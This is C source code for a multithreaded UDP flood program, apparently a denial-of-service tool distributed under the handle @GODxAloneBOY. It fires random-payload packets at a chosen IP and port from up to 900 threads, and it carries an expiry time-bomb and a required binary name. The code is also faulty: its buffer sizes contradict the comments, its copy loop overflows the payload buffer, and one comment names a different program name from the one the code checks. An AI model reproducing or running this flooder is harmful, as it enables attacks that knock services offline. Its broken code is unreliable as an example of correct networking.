#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <pthread.h>
#include <errno.h>

#define PAYLOAD_SIZE 25           // 20 KB payload
#define RANDOM_STRING_SIZE 999   // Size of each random string
#define DEFAULT_THREAD_COUNT 900  // Default thread count
#define EXPIRY_DATE "2026-2-17"    // Expiry date in YYYY-MM-DD format

typedef struct {
    char ip[16];
    int port;
    int duration;
} AttackParams;

// Check if the current date is past the expiry date
int is_expired() {
    int expiry_year, expiry_month, expiry_day;
    sscanf(EXPIRY_DATE, "%d-%d-%d", &expiry_year, &expiry_month, &expiry_day);

    // Get the current date
    time_t now = time(NULL);
    struct tm *current_time = localtime(&now);

    // Compare year, month, and day
    if (current_time->tm_year + 1900 > expiry_year ||
        (current_time->tm_year + 1900 == expiry_year && current_time->tm_mon + 1 > expiry_month) ||
        (current_time->tm_year + 1900 == expiry_year && current_time->tm_mon + 1 == expiry_month && current_time->tm_mday > expiry_day)) {
        return 1; // Expired
    }
    return 0; // Not expired
}

// Generate a random string of a fixed size
void generate_random_string(char *buffer, size_t size) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789/";
    for (size_t i = 0; i < size; i++) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buffer[size] = '\0'; // Null-terminate the string
}

// Function to send UDP packets efficiently
void* send_udp_packets(void* arg) {
    AttackParams *params = (AttackParams *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char payload[PAYLOAD_SIZE];
    char random_string[RANDOM_STRING_SIZE + 1];

    // Create UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Set socket to non-blocking mode
    fcntl(sock, F_SETFL, O_NONBLOCK);

    // Increase socket buffer size
    int size = 1024 * 1024; // 1MB buffer
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &size, sizeof(size));
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &size, sizeof(size));

    // Set up server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    if (inet_pton(AF_INET, params->ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/Address not supported");
        close(sock);
        pthread_exit(NULL);
    }

    // Fill the payload with random strings
    for (size_t i = 0; i < PAYLOAD_SIZE; i += RANDOM_STRING_SIZE) {
        generate_random_string(random_string, RANDOM_STRING_SIZE);
        strncpy(payload + i, random_string, RANDOM_STRING_SIZE);
    }

    // Send the payload continuously during the specified duration
    time_t start_time = time(NULL);
    while (time(NULL) - start_time < params->duration) {
        if (sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                usleep(100); // Sleep for 100 microseconds before retrying
            } else {
                perror("Send failed");
                break;
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    // Enforce the program name to be "raja"
    if (strcmp(argv[0], "./ALONE") != 0) {
        fprintf(stderr, "Error: The program must be named 'ALONE'. Rename the binary to 'ALONE' and try again.\n");
        return 1;
    }

    // Check if the program is expired
    if (is_expired()) {
        fprintf(stderr, "apne baap se new file leke aa @GODxAloneBOY.\n");
        return 1;
    }

    // Default values
    const char *default_ip = "127.0.0.1";
    int default_port = 80;
    int default_time = 60;
    int default_threads = DEFAULT_THREAD_COUNT;

    // Parse command-line arguments
    AttackParams params;
    if (argc >= 2) {
        strncpy(params.ip, argv[1], sizeof(params.ip) - 1);
    } else {
        strncpy(params.ip, default_ip, sizeof(params.ip) - 1);
    }

    params.port = (argc >= 3) ? atoi(argv[2]) : default_port;
    params.duration = (argc >= 4) ? atoi(argv[3]) : default_time;
    int thread_count = (argc >= 5) ? atoi(argv[4]) : default_threads;

    // Validate thread count
    if (thread_count <= 0) {
        fprintf(stderr, "Invalid thread count. Using default: %d\n", DEFAULT_THREAD_COUNT);
        thread_count = DEFAULT_THREAD_COUNT;
    }

    // Print the values being used
    printf("Using values: IP = %s, Port = %d, Duration = %d seconds, Threads = %d\n",
           params.ip, params.port, params.duration, thread_count);

    // Seed the random number generator
    srand(time(NULL));

    // Create threads to send packets
    pthread_t threads[thread_count];
    for (int i = 0; i < thread_count; i++) {
        if (pthread_create(&threads[i], NULL, send_udp_packets, &params) != 0) {
            perror("Thread creation failed");
            return 1;
        }
    }

    // Wait for all threads to finish
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack finished made by @GODxAloneBOY .\n");
    return 0;
}